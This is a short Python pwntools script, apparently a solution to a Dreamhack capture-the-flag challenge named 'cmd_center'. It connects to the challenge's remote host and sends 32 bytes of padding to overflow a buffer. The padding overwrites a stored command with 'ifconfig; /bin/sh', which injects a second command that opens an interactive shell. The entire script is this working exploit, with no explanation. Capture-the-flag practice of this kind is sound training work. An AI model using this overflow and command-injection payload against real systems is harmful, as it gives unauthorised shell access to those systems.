from pwn import *

#p = process("./cmd_center")
p = remote("host3.dreamhack.games", 24150)
#e = ELF("./cmd_center")

payload = b"A"*0x20
payload += b"ifconfig"
payload += b"; /bin/sh"

p.sendafter(b"Center name: ", payload)

p.interactive()
